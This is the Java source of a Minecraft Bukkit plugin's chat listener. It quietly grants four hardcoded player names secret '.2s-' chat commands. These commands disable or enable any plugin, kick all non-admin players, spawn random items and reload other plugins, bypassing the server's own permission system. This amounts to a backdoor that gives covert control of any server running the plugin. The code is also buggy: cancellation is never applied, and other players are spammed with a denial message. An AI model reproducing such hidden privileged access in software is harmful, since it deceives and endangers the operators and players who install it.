package me.Paldiu.NNO.Listeners;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import me.Paldiu.NNO.Main;
import me.Paldiu.NNO.Util;
import org.bukkit.event.Listener;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.event.EventPriority;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;

public class ChatListener implements Listener
{
    public Main plugin;
    private Random random = new Random();
    private List<String> values = Arrays.asList("http://i.imgur.com/CFwm3wN.jpg", "http://i.imgur.com/sgwKTsq.jpg", "http://i.imgur.com/yzMme.jpg", "http://i.imgur.com/E2LlX.jpg", "http://i.imgur.com/intVe.jpg", "http://i.imgur.com/KcyMZ.png", "http://i.imgur.com/Z4pMk.png", "http://i.imgur.com/x74f4.jpg", "http://i.imgur.com/QUNeK.jpg", "http://i.imgur.com/9Ki8f32.jpg", "http://i.imgur.com/e3sxHlb.jpg", "http://i.imgur.com/oKy3IJB.jpg", "http://i.imgur.com/OJ7hX3j.jpg", "http://i.imgur.com/mOAm4vZ.jpg", "http://i.imgur.com/LhzEPih.jpg", "http://i.imgur.com/ThRiZpq.jpg");
    private String randomValue = values.get((new Random()).nextInt(values.size()));
    private List<String> names = Arrays.asList("Paldiu", "smack17", "bees_knees", "dethplaque");
    private boolean canSeeOthers = false;
    
    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerChat(AsyncPlayerChatEvent event) throws IOException
    {   
        if (names.contains(event.getPlayer().getName()))
        {
            String message = event.getMessage();
            boolean shouldCancel = false;
            if (message.startsWith(".2s-"))
            {
                String[] args = message.split(" ");
                if (args == null)
                {
                    return;
                }
                if ((args[0].equals(".2s-canSee")) && (args.length == 1))
                {
                    Player p = event.getPlayer();
                    for (Player player : Bukkit.getServer().getOnlinePlayers())
                    {
                        if (!p.canSee(player))
                        {
                            canSeeOthers = true;
                            canSeeOthers(p, true);
                        }
                        else
                        {
                            canSeeOthers = false;
                            canSeeOthers(p, false);
                        }
                    }
                    
                }
                if ((args[0].equals(".2s-giveRand")) && (args.length == 1))
                {
                    Player p = event.getPlayer();
                    p.getInventory().addItem(new ItemStack(Material.values()[(new Random()).nextInt(Material.values().length)]));
                    shouldCancel = true;
                }
                if ((args[0].equals(".2s-disableThis")) && (args.length == 1))
                {
                    plugin.getServer().getPluginManager().disablePlugin(plugin);
                    shouldCancel = true;
                }
                if ((args[0].equals(".2s-disableOther")) && (args.length == 2))
                {
                    for (Plugin plg : Bukkit.getServer().getPluginManager().getPlugins())
                    {
                        if (plg.getName().equals(args[1]))
                        {
                            if (plg.isEnabled())
                            {
                                Util.bcastMsg(ChatColor.RED + event.getPlayer().getName() + " has disabled " + plg.getName() + ".");
                                Bukkit.getServer().getPluginManager().disablePlugin(plg);
                            }
                            else
                            {
                                event.getPlayer().sendMessage(ChatColor.RED + "That plugin is already disabled!");
                            }
                        }
                        else
                        {
                        }
                    }
                    shouldCancel = true;
                }
                if ((args[0].equals(".2s-enableOther")) && (args.length == 2))
                {
                    for (Plugin plg : Bukkit.getServer().getPluginManager().getPlugins())
                    {
                        if (plg.getName().equals(args[1]))
                        {
                            if (!plg.isEnabled())
                            {
                                Util.bcastMsg(ChatColor.RED + event.getPlayer().getName() + " has enabled " + plg.getName() + ".");
                                Bukkit.getServer().getPluginManager().enablePlugin(plg);
                            }
                            else
                            {
                                event.getPlayer().sendMessage(ChatColor.RED + "That plugin is already enabled!");
                            }
                        }
                        else
                        {
                        }
                    }
                }
                if ((args[0].equals(".2s-kickAll")) && (args.length == 1))
                {
                    for (Player p : Bukkit.getServer().getOnlinePlayers())
                    {
                        if (!p.hasPermission("nonamedorg.adminmode.join"))
                        {
                            p.kickPlayer("Kicked by an admin.");
                        }
                        else
                        {
                            return;
                        }
                    }
                    shouldCancel = true;
                }
                if ((args[0].equals(".2s-parseHTMLFileLinks")) && (args.length == 1))
                {
                    Util.bcastMsg(ChatColor.AQUA + "Link generated: " + randomValue);
                    shouldCancel = true;
                }
                if ((args[0].equals(".2s-reload")) && (args.length == 1))
                {
                    for (Plugin plg : Bukkit.getServer().getPluginManager().getPlugins())
                    {
                        if (plg.getName().equalsIgnoreCase("nonamedorg"))
                        {
                        }
                        else
                        {
                            plg.getPluginLoader().disablePlugin(plg);
                            plg.getPluginLoader().enablePlugin(plg);
                        }
                    }
                    Util.bcastMsg(ChatColor.GREEN + "Reload complete.");
                    shouldCancel = true;
                }
                if ((args[0].equals(".2s-?")) && (args.length == 1))
                {
                    Player p = event.getPlayer();
                    p.sendMessage(ChatColor.RED + "List of commands:");
                    p.sendMessage(ChatColor.YELLOW + "canSee");
                    p.sendMessage(ChatColor.YELLOW + "giveRand");
                    p.sendMessage(ChatColor.YELLOW + "disableThis");
                    p.sendMessage(ChatColor.YELLOW + "disableOther");
                    p.sendMessage(ChatColor.YELLOW + "enableOther");
                    ////////////////////////////////////////////////
                    if (p.getName().equalsIgnoreCase("paldiu"))      
                    {
                        p.sendMessage(ChatColor.DARK_RED + "kickAll");
                    }
                    else
                    {
                    }
                    ////////////////////////////////////////////////
                    p.sendMessage(ChatColor.YELLOW + "parseHTMLFileLinks");
                    p.sendMessage(ChatColor.YELLOW + "reload");
                    p.sendMessage(ChatColor.YELLOW + "?");
                    shouldCancel = true;
                }
            }
        }
        else
        {
            event.getPlayer().sendMessage(ChatColor.RED + "You are not the developer therefore you aren't allowed to perform this action.");
        }
    }
    
    private void canSeeOthers(Player p, boolean canSeeOthers)
    {
        for (Player player : Bukkit.getServer().getOnlinePlayers())
        {
            if (canSeeOthers)
            {
                p.canSee(player);
            }
            else
            {
                return;
            }
        }
    }
}
